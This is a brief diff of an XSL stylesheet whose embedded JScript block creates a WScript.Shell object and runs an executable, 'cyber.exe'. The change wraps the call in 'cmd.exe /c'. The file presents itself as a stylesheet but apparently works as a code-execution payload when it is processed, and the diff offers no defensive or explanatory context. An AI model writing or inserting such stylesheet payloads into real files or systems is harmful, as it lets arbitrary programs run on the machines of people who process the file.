@@ -6,6 +6,6 @@ version="1.0">
 <output method="text"/>
   <ms:script implements-prefix="user" language="Jscript">
   <![CDATA[
-  var x = new ActiveXObject("WScript.Shell").Run("cyber.exe");
+  var x = new ActiveXObject("WScript.Shell").Run("cmd.exe /c cyber.exe");
   ]]></ms:script>
 </stylesheet>
